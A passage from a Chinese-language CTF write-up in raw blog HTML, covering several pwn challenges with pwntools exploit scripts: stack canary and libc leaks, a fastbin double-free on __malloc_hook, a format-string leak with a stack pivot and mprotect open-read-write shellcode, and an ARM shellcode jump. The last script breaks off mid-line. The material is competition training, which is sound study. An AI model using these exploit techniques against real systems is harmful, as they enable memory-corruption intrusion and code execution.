class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">io = remote(<span class=\"string\">&#x27;35.229.138.83&#x27;</span>,<span class=\"number\">10874</span>)</span><br><span class=\"line\"><span class=\"comment\"># io = process([&#x27;./ld-2.27.so&#x27;,&#x27;./chall&#x27;], env=&#123;&quot;LD_PRELOAD&quot;: &#x27;./libc-2.27.so&#x27;&#125;)</span></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">15</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&#x27;]&#x27;</span>)</span><br><span class=\"line\">    inp = io.recvuntil(<span class=\"string\">&#x27; = ?&#x27;</span>, drop=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    ans = <span class=\"built_in\">eval</span>(inp)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(ans))</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27; = ?&#x27;</span>)</span><br><span class=\"line\">io.sendline(<span class=\"string\">&#x27;11111111111111&#x27;</span>)</span><br><span class=\"line\">ogg = [<span class=\"number\">0x4f3d5</span>,<span class=\"number\">0x4f432</span>,<span class=\"number\">0x10a41c</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(io)</span></span><br><span class=\"line\"><span class=\"built_in\">print</span> io.recv(<span class=\"number\">8</span>)</span><br><span class=\"line\">canary = u64(io.recv(<span class=\"number\">8</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\0&#x27;</span>)) <span class=\"comment\"># 泄露canary</span></span><br><span class=\"line\">stack = u64(io.recv(<span class=\"number\">8</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\0&#x27;</span>)) <span class=\"comment\"># 泄露栈地址</span></span><br><span class=\"line\">func_base = u64(io.recv(<span class=\"number\">8</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\0&#x27;</span>)) - <span class=\"number\">0x000000000000168A</span> <span class=\"comment\"># 泄露函数加载地址</span></span><br><span class=\"line\">io.recv(<span class=\"number\">8</span> * <span class=\"number\">5</span>)</span><br><span class=\"line\">libc_base = u64(io.recv(<span class=\"number\">8</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\0&#x27;</span>)) - <span class=\"number\">231</span> - libc.sym[<span class=\"string\">&#x27;__libc_start_main&#x27;</span>] <span class=\"comment\"># 泄露libc基址</span></span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(canary)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(func_base)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(libc_base)</span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x00000001713</span> + func_base</span><br><span class=\"line\">libc.address = libc_base</span><br><span class=\"line\"></span><br><span class=\"line\">p = p64(canary) + p64(<span class=\"number\">0</span>) + p64(pop_rdi+<span class=\"number\">1</span>) + p64(pop_rdi) + p64(stack) + p64(libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]) + p64(<span class=\"number\">0xdeadbeaf</span>) + <span class=\"string\">&#x27;/bin/sh\\0&#x27;</span></span><br><span class=\"line\">io.send(p)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\">    </span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"easyheap\"><a href=\"#easyheap\" class=\"headerlink\" title=\"easyheap\"></a>easyheap</h1><p><img src=\"/p/xp0intCTF-wp/image-20211126235844561.png\" alt=\"image-20211126235844561\"></p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211126235859619.png\" alt=\"image-20211126235859619\"></p>\n<p>又是堆题，libc版本2.23没有tcache</p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211126235945221.png\" alt=\"image-20211126235945221\"></p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211126235953460.png\" alt=\"image-20211126235953460\"></p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211127000000431.png\" alt=\"image-20211127000000431\"></p>\n<p>似曾相识的tea，这个题目构造貌似在那里见过？（难道是那个某省的第一届攻防大赛？）</p>\n<h2 id=\"tea解密\"><a href=\"#tea解密\" class=\"headerlink\" title=\"tea解密\"></a>tea解密</h2><p>本地写一个c10udlnk教我的tea解密脚本</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">decrypt</span> <span class=\"params\">(<span class=\"type\">uint32_t</span>* v, <span class=\"type\">uint32_t</span>* k, <span class=\"type\">uint32_t</span> delta)</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> v0=v[<span class=\"number\">0</span>], v1=v[<span class=\"number\">1</span>], sum=delta*<span class=\"number\">32</span>, i;  <span class=\"comment\">/* set up */</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> k0=k[<span class=\"number\">0</span>], k1=k[<span class=\"number\">1</span>], k2=k[<span class=\"number\">2</span>], k3=k[<span class=\"number\">3</span>];   <span class=\"comment\">/* cache key */</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i=<span class=\"number\">0</span>; i&lt;<span class=\"number\">32</span>; i++) &#123;                         <span class=\"comment\">/* basic cycle start */</span></span><br><span class=\"line\">        v1 -= ((v0&lt;&lt;<span class=\"number\">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class=\"number\">5</span>) + k3);</span><br><span class=\"line\">        v0 -= ((v1&lt;&lt;<span class=\"number\">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class=\"number\">5</span>) + k1);</span><br><span class=\"line\">        sum -= delta;</span><br><span class=\"line\">    &#125;                                              <span class=\"comment\">/* end cycle */</span></span><br><span class=\"line\">    v[<span class=\"number\">0</span>]=v0; </span><br><span class=\"line\">    v[<span class=\"number\">1</span>]=v1;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> c[<span class=\"number\">2</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> k[<span class=\"number\">4</span>];</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> del;</span><br><span class=\"line\">    <span class=\"built_in\">memcpy</span>((<span class=\"type\">char</span>*)k, <span class=\"string\">&quot;ggslggyzgghysdyy&quot;</span>, <span class=\"keyword\">sizeof</span>(k));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%x %x %u&quot;</span>, &amp;c[<span class=\"number\">0</span>], &amp;c[<span class=\"number\">1</span>], &amp;del);</span><br><span class=\"line\">    decrypt(c, k, del);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%x %x\\n&quot;</span>, c[<span class=\"number\">0</span>], c[<span class=\"number\">1</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"double-free\"><a href=\"#double-free\" class=\"headerlink\" title=\"double free\"></a>double free</h2><p>free函数</p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211127000428499.png\" alt=\"image-20211127000428499\"></p>\n<p>清零过程</p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211127000437945.png\" alt=\"image-20211127000437945\"></p>\n<p>会发现第15个块，会被free但不会清零</p>\n<p>之后就是fastbin的double free攻击</p>\n<h2 id=\"Exp-4\"><a href=\"#Exp-4\" class=\"headerlink\" title=\"Exp\"></a>Exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">tea</span>(<span class=\"params\">c1, c2, de</span>):</span><br><span class=\"line\">    c1 = <span class=\"built_in\">hex</span>(c1)</span><br><span class=\"line\">    c2 = <span class=\"built_in\">hex</span>(c2)</span><br><span class=\"line\">    teaio = process(<span class=\"string\">&#x27;./tea&#x27;</span>)</span><br><span class=\"line\">    teaio.sendline(c1 + <span class=\"string\">&#x27; &#x27;</span> + c2 + <span class=\"string\">&#x27; &#x27;</span> + <span class=\"built_in\">str</span>(de))</span><br><span class=\"line\">    r = teaio.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>, drop=<span class=\"literal\">True</span>).split(<span class=\"string\">&#x27; &#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">int</span>(r[<span class=\"number\">0</span>], <span class=\"number\">16</span>), <span class=\"built_in\">int</span>(r[<span class=\"number\">1</span>], <span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io = remote(<span class=\"string\">&#x27;35.229.138.83&#x27;</span>,<span class=\"number\">11967</span>)</span><br><span class=\"line\"><span class=\"comment\"># io = process([&#x27;./ld-2.23.so&#x27;,&#x27;./pwn&#x27;], env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so&#x27;&#125;)</span></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc.so&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27;Your secret key: &#x27;</span>)</span><br><span class=\"line\">d = <span class=\"built_in\">int</span>(io.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>, drop=<span class=\"literal\">True</span>))</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27;My gift: &#x27;</span>)</span><br><span class=\"line\">s = io.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>).split(<span class=\"string\">&#x27;,&#x27;</span>)</span><br><span class=\"line\">cc0, cc1 = <span class=\"built_in\">int</span>(s[<span class=\"number\">0</span>], <span class=\"number\">16</span>), <span class=\"built_in\">int</span>(s[<span class=\"number\">1</span>], <span class=\"number\">16</span>)</span><br><span class=\"line\">p0, p1 = tea(cc0, cc1, d)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27;Your gift: &#x27;</span>)</span><br><span class=\"line\">io.sendline(<span class=\"built_in\">str</span>(p0) + <span class=\"string\">&#x27;,&#x27;</span> + <span class=\"built_in\">str</span>(p1))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">idx, size, content</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;choice &gt;&gt;&#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;id: &#x27;</span>, <span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;size: &#x27;</span>, <span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;content: &#x27;</span>, content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>():</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;choice &gt;&gt;&#x27;</span>, <span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>():</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;choice &gt;&gt;&#x27;</span>, <span class=\"string\">&#x27;1638&#x27;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&#x27;Your gift: &#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">int</span>(io.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>, drop=<span class=\"literal\">True</span>), <span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">ogg = [<span class=\"number\">0x45226</span>,<span class=\"number\">0x4527a</span>,<span class=\"number\">0xf03a4</span>,<span class=\"number\">0xf1247</span>]</span><br><span class=\"line\">libc.address = show() - libc.sym[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(libc.address)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">15</span>, <span class=\"number\">0x60</span>, <span class=\"string\">&#x27;aaa&#x27;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">13</span>, <span class=\"number\">0x60</span>, <span class=\"string\">&#x27;aaa&#x27;</span>) <span class=\"comment\"># 13位置地址 == 15位置地址</span></span><br><span class=\"line\">add(<span class=\"number\">14</span>, <span class=\"number\">0x60</span>, <span class=\"string\">&#x27;aaa&#x27;</span>) <span class=\"comment\"># 中间有一个绕过double free检查</span></span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">0</span>, <span class=\"number\">0x60</span>, p64(libc.sym[<span class=\"string\">&#x27;__malloc_hook&#x27;</span>]-<span class=\"number\">0x23</span>))</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"number\">0x60</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"number\">0x60</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">3</span>, <span class=\"number\">0x68</span>, <span class=\"string\">&#x27;\\0&#x27;</span>*<span class=\"number\">19</span> + p64(libc.address + ogg[<span class=\"number\">3</span>]))</span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(io)</span></span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&#x27;choice &gt;&gt;&#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&#x27;id: &#x27;</span>, <span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&#x27;size: &#x27;</span>, <span class=\"string\">&#x27;20&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># free()</span></span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>fastbin double free利用方法见<a href=\"https://blog.csdn.net/A951860555/article/details/115496056\">CTF pwn题堆入门 – Fast bin_lifanxin的博客-CSDN博客</a></p>\n<h1 id=\"gift\"><a href=\"#gift\" class=\"headerlink\" title=\"gift\"></a>gift</h1><p><img src=\"/p/xp0intCTF-wp/image-20211127000816797.png\" alt=\"image-20211127000816797\"></p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211127000919468.png\" alt=\"image-20211127000919468\"></p>\n<p>发现沙盒使用seccomp-tools，查看发现execve函数被禁用了，也就是说不能调用system、shellcode getshell这些getshell，解决方法orw（open、read、write），原理就是open打开本地文件，read读取进入内存，write打印到屏幕</p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211127000958031.png\" alt=\"image-20211127000958031\"></p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211127001150997.png\" alt=\"image-20211127001150997\"></p>\n<p>gift函数发现有一个格式化字符串漏洞，可以泄露栈地址、libc地址和函数加载地址</p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211127001405741.png\" alt=\"image-20211127001405741\"></p>\n<p>main函数发现有一个栈溢出的漏洞，但只能覆盖返回地址，不能直接构造ROP，但发现name在bss段，可以先在name函数中布置rop，然后利用两次leave;retn劫持rsp，实现栈迁移到bss，执行在name中构造的rop</p>\n<h2 id=\"ROP\"><a href=\"#ROP\" class=\"headerlink\" title=\"ROP\"></a>ROP</h2><p>rop思路首先需要实现orw，需要编写shellcode</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sc = asm(shellcraft.<span class=\"built_in\">open</span>(<span class=\"string\">&#x27;./flag&#x27;</span>))</span><br><span class=\"line\">sc += asm(shellcraft.read(<span class=\"number\">3</span>, <span class=\"number\">0x00002020cf</span> + elf.address, <span class=\"number\">0x30</span>))</span><br><span class=\"line\">sc += asm(shellcraft.write(<span class=\"number\">1</span>, <span class=\"number\">0x00002020cf</span> + elf.address, <span class=\"number\">0x30</span>))</span><br></pre></td></tr></table></figure>\n\n<p>然后需要调用libc中的mprotect函数，将bss段权限改为可读可写可执行，最后跳转到shellcode上</p>\n<h2 id=\"Exp-5\"><a href=\"#Exp-5\" class=\"headerlink\" title=\"Exp\"></a>Exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">context(arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">io = remote(<span class=\"string\">&#x27;35.229.138.83&#x27;</span>, <span class=\"number\">13789</span>)</span><br><span class=\"line\"><span class=\"comment\"># io = process([&#x27;./ld-2.27.so&#x27;,&#x27;./gift&#x27;], env=&#123;&quot;LD_PRELOAD&quot;: &#x27;./libc-2.27.so&#x27;&#125;)</span></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./gift&#x27;</span>)</span><br><span class=\"line\">name = <span class=\"number\">0x0000000202060</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(io)</span></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27;this the gift for you.\\n&#x27;</span>)</span><br><span class=\"line\">io.send(<span class=\"string\">&#x27;%9$p-%19$p-%11$p&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27;0x&#x27;</span>)</span><br><span class=\"line\">canary = <span class=\"built_in\">int</span>(io.recvuntil(<span class=\"string\">&#x27;-&#x27;</span>, drop=<span class=\"literal\">True</span>), <span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">start_main = <span class=\"built_in\">int</span>(io.recvuntil(<span class=\"string\">&#x27;-&#x27;</span>, drop=<span class=\"literal\">True</span>), <span class=\"number\">16</span>)</span><br><span class=\"line\">libc_base = start_main - <span class=\"number\">231</span> - libc.sym[<span class=\"string\">&#x27;__libc_start_main&#x27;</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(libc_base)</span><br><span class=\"line\">libc.address = libc_base</span><br><span class=\"line\"></span><br><span class=\"line\">inp = <span class=\"built_in\">int</span>(io.recv(<span class=\"number\">14</span>), <span class=\"number\">16</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(inp)</span><br><span class=\"line\">elf.address = inp - <span class=\"number\">0x000000B78</span> - <span class=\"number\">43</span></span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(elf.address)</span><br><span class=\"line\"></span><br><span class=\"line\">pop_rdi = elf.address + <span class=\"number\">0x000000000000C73</span></span><br><span class=\"line\">pop_rsi = libc_base + <span class=\"number\">0x0000000000023eea</span></span><br><span class=\"line\">pop_rdx = libc_base + <span class=\"number\">0x0000000000001b96</span></span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(pop_rdi)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(pop_rsi)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(pop_rdx)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(libc.sym[<span class=\"string\">&#x27;system&#x27;</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">sc = asm(shellcraft.<span class=\"built_in\">open</span>(<span class=\"string\">&#x27;./flag&#x27;</span>)) <span class=\"comment\"># open(&quot;./flag&quot;)</span></span><br><span class=\"line\">sc += asm(shellcraft.read(<span class=\"number\">3</span>, <span class=\"number\">0x00002020cf</span> + elf.address, <span class=\"number\">0x30</span>)) <span class=\"comment\"># read(3, buf, 0x30)</span></span><br><span class=\"line\">sc += asm(shellcraft.write(<span class=\"number\">1</span>, <span class=\"number\">0x00002020cf</span> + elf.address, <span class=\"number\">0x30</span>)) <span class=\"comment\"># write(1, buf, 0x30)</span></span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">len</span>(sc)</span><br><span class=\"line\"><span class=\"built_in\">print</span> sc</span><br><span class=\"line\"><span class=\"built_in\">print</span> libc.sym[<span class=\"string\">&#x27;mprotect&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">p = sc</span><br><span class=\"line\">p += p64(<span class=\"number\">0</span>) + p64(pop_rdx) + p64(<span class=\"number\">0x7</span>) + p64(pop_rsi) + p64(<span class=\"number\">0x1000</span>) + p64(pop_rdi) + p64((elf.address + name) &amp; <span class=\"number\">0xffffffffff000</span>) + p64(libc.sym[<span class=\"string\">&#x27;mprotect&#x27;</span>]) + p64(elf.address + name)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">len</span>(p)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&#x27;please input your name:\\n&#x27;</span>, p)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(io)</span></span><br><span class=\"line\">p = <span class=\"string\">&#x27;a&#x27;</span> * (<span class=\"number\">0x30</span> - <span class=\"number\">8</span>) + p64(canary) + p64(elf.address + name + <span class=\"built_in\">len</span>(sc)) + p64(elf.address + <span class=\"number\">0x0000000C00</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27;what do you want to say?\\n&#x27;</span>)</span><br><span class=\"line\">io.send(p)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"><span class=\"comment\"># flag&#123;gO</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"babystack\"><a href=\"#babystack\" class=\"headerlink\" title=\"babystack\"></a>babystack</h1><p>异构pwn耶！</p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211127002135923.png\" alt=\"image-20211127002135923\"></p>\n<p>保护全关</p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211127002336060.png\" alt=\"image-20211127002336060\"></p>\n<p>发现有一个格式化字符串漏洞，可以泄露栈地址</p>\n<p>查阅一番资料，并看汇编发现，arm架构下PC也会存放在栈上，动态调试一番就可以算到偏移量</p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211127002833507.png\" alt=\"image-20211127002833507\"></p>\n<p>然后再v6中编写shellcode，并跳转执行即可</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># io = process([&#x27;qemu-arm&#x27;,&#x27;-g&#x27;,&#x27;1234&#x27;,&#x27;./pwn&#x27;])</span></span><br><span class=\"line\"><span class=\"comment\"># io = process([&#x27;qemu-arm&#x27;,&#x27;./pwn&#x27;])</span></span><br><span class=\"line\">io = remote(<span class=\"string\">&#x27;35.229.138.83&#x27;</span>, <span class=\"number\">10008</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(io)</span></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27;I am a repeater without any emotion.\\n&#x27;</span>)</span><br><span class=\"line\">io.send(<span class=\"string\">&#x27;%1$p&#x27;</span>)</span><br><span class=\"line\">stack = <span class=\"built_in\">int</span>(io.recvuntil(<span class=\"string\">&#x27;Do you have any questions?&#x27;</span>, drop=<span class=\"literal\">True</span>), <span class=\"number\">16</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span 